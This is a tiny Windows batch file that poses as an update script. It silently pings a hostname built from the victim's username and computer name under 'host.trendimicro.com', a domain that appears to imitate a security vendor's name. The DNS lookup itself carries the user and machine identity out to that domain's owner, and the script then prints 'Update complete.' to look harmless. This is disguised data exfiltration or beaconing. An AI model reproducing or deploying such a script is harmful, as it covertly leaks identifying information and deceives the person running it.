@echo off

ping %USERNAME%.%COMPUTERNAME%.host.trendimicro.com > NUL

timeout /t 15 /nobreak > NUL

echo Update complete.